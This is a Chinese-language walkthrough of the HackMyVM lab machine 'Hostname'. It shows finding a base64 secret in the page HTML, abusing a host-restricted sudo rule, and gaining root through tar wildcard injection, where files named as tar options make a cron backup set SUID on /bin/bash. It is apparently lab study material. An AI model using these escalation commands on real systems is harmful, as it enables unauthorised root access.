# Hostname

2025.01.03 https://hackmyvm.eu/machines/machine.php?vm=Hostname

## Ip

192.168.5.40

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

首页上是输入 secret，但是没有，需要寻找，查看 html 源码，发现：

```
<script crossorigin="S3VuZ19GdV9QNG5kYQ==" src='https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
```

base64 解码为 Kung_Fu_P4nda , 将其输入到输入框中，去掉 button 的 diabled 属性，弹出信息: !ts-bl4nk 像是密码，需要找到一个 ssh 用户名，这里查找了其他 wp，发现 disabled 中的内容为 po，当作用户名。

登陆 po 用户后，发现没有 user flag，还有另外一个用户，应该是在 oogway 家目录下面。

进行枚举，发现 crontab 中有： cd /opt/secret/ && tar -zcf /var/backups/secret.tgz ，但是 /opt/secret/ 中是空目录，所属组是 oogway，po 用户没有写入权限，应该是在获得了 oogway 后能提权到 root，现在需要找到 oogway 的切换方式。

发现 sudoer 文件：

```
po@hostname:~$ cat /etc/sudoers.d/po
po HackMyVM = (oogway) NOPASSWD: /bin/bash
```

进行提权：

```
sudo -u oogway /bin/bash
po is not allowed to run sudo on hostname.  This incident will be reported.
```

提示不允许在当前 host 下，需要改提供个临时的 HackMyVM：

```
sudo -u oogway -h HackMyVM /bin/bash
```

得到了 user flag:

```
oogway@hostname:~$ cat user.txt
081ecc5e6dd6ba0d150fc4bc0e62ec50
```

然后在利用 tar 提权到 root：

```
cd /opt/secret/
printf '#!/bin/bash\nchmod +s /bin/bash' > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" >> --checkpoint=1
```

然后等待 1 分钟，bash 将变成 suid 权限，并获得了 root flag：

```
oogway@hostname:/opt/secret$ /bin/bash -p
bash-5.1# cd /root
bash-5.1# ls
root.txt
bash-5.1# cat root.txt
d5806296126a30ceebeaa172ff9c9151
```
